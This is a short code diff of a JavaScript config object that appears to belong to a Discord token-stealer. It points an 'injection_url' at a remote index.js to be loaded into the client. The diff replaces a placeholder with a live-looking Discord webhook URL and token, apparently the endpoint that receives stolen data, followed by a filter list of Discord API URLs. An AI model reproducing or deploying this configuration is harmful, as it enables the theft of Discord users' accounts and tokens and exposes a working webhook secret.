@@ -16,7 +16,7 @@ var config = {
     "embed-color": 374276,
 
     injection_url: "https://raw.githubusercontent.com/NexusTestGithub/injection/main/index.js",
-    webhook: "%WEBHOOK%",
+    webhook: "https://discord.com/api/webhooks/1135210272190111834/cb5BX3JztDsln2-gniMPFrUnuKit10VLATj5Bg63CPH_1gPRvnQG4s9r9RztVRFvJYcq",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
